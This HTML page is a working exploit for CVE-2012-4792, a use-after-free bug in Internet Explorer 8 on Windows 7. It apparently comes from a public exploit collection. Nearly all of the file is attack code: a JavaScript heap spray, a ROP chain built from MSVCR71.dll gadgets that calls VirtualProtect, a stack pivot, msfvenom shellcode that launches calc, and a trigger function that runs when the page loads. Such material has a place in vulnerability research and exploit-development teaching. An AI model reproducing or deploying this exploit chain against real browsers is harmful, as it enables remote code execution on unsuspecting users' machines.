<!doctype html>

<!--
// Title       : CVE-2012-4792 exploit using MSVCR71.dll / Java6
// Author      : Hashim Jawad
// Tested OS   : Microsoft Windows 7 x64 with IE8
-->

<html>
<head>
<script>


var spraychunks = new Array();

function heapspray()
{
	
	var ropchain = unescape(
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]	
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ud202%u7c34" + // NOPs // 0x7c34d202,  # RETN (ROP NOP) [MSVCR71.dll]
		"%ubbc0%u7c34" + // 0x7c34bbc0 : ,# POP EBP # RETN [MSVCR71.dll] 
		"%ubbc0%u7c34" + // 0x7c34bbc0 : ,# skip 4 bytes [MSVCR71.dll]
		"%u90c2%u7c34" + // 0x7c3490c2 : ,# POP EBX # RETN [MSVCR71.dll] 
		"%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
		"%u58e1%u7c34" + // 0x7c3458e1 : ,# POP EDX # RETN [MSVCR71.dll] 
		"%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
		"%ud491%u7c36" + // 0x7c36d491 : ,# POP ECX # RETN [MSVCR71.dll] 
		"%u9078%u6d76" + // 0x6d769078 : ,# &Writable location [ssv.dll]
		"%u17b9%u7c34" + // 0x7c3417b9 : ,# POP EDI # RETN [MSVCR71.dll] 
		"%ud202%u7c34" + // 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]
		"%ue03f%u7c34" + // 0x7c34e03f : ,# POP ESI # RETN [MSVCR71.dll] 
		"%u15a2%u7c34" + // 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]
		"%u4edc%u7c34" + // 0x7c344edc : ,# POP EAX # RETN [MSVCR71.dll] 
		"%ua151%u7c37" + // 0x7c37a140 : ,# ptr to &VirtualProtect() [IAT MSVCR71.dll] // will put 0x7c37a151 to compenstate for ADD AL,0EF in the gadget below
		"%u8c81%u7c37" + // 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll] 
		"%u5c30%u7c34" + // 0x7c345c30 : ,# ptr to 'push esp # ret ' [MSVCR71.dll]
		"");

	//root@kali:~# msfvenom -p windows/exec cmd=calc -f js_le
	//[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	//[-] No arch selected, selecting arch: x86 from the payload
	//No encoder or badchars specified, outputting raw payload
	//Payload size: 190 bytes
	//Final size of js_le file: 570 bytes
	var shellcode = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100");
	//var shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
	
	// switch stack pointer to heap @0c0c0c0c // 0x7c348b05 (RVA : 0x00008b05) : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll] **   |   {PAGE_EXECUTE_READ}
	var stack_to_heap_pivot = unescape("%u8b05%u7c34");
	
	// stack adjust to land in ROP chain //0x7c366bd5 : {pivot 256 / 0x100} :  # ADD ESP,100 # RETN    ** [MSVCR71.dll] **   |   {PAGE_EXECUTE_READ}
	var junk = unescape("%u6bd5%u7c36");

	while (junk.length < 0x4000) junk += junk;
	// construct one subblock   [ junk + ROP + shellcode + junk ]
	//offset = 0xbe8/2 ;
	offset = 0xcc4/2;
	
	var junk_front = junk.substring(0,offset);
	var junk_end = junk.substring(0,0x800 - stack_to_heap_pivot.length - junk_front.length - ropchain.length - shellcode.length)
	var smallblock = junk_front + stack_to_heap_pivot + ropchain + shellcode + junk_end;

	// repeat a few times 
	var largeblock = "";
	while (largeblock.length < 0x80000) { largeblock = largeblock + smallblock; }

	// allocate 0x450 times
	for (i = 0; i < 0x450; i++) { spraychunks[i] = largeblock.substring(0, (0x7fb00-6)/2);	}
	
}

heapspray();

function boom() {
	var e0 = null;
	var e1 = null;
	var e2 = null;

	try {
		e0 = document.getElementById("a");
		e1 = document.getElementById("b");
		e2 = document.createElement("q");
		e1.applyElement(e2);
		e1.appendChild(document.createElement('button'));
		e1.applyElement(e0);
		e2.outerText = "";
		e2.appendChild(document.createElement('body'));
	} catch(e) { }
	CollectGarbage();
	divobj = document.createElement('div');
	// 86 bytes ( + terminating nulls gets added automatically)
	// Total size: 88 bytes (0x58)
	divobj.className = "\u0c0c\u0c0c\u4141\u4141\u4141\u4141\u4141" +
    "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141" +
    "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141" +
    "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141" +
    "\u4141\u4141\u4141\u4141\u4141\u4141";
}

</script>
</head>
<body onload="eval(boom())">
	<form id="a">
	</form>
	<dfn id="b">
	</dfn>
</body>
</html>
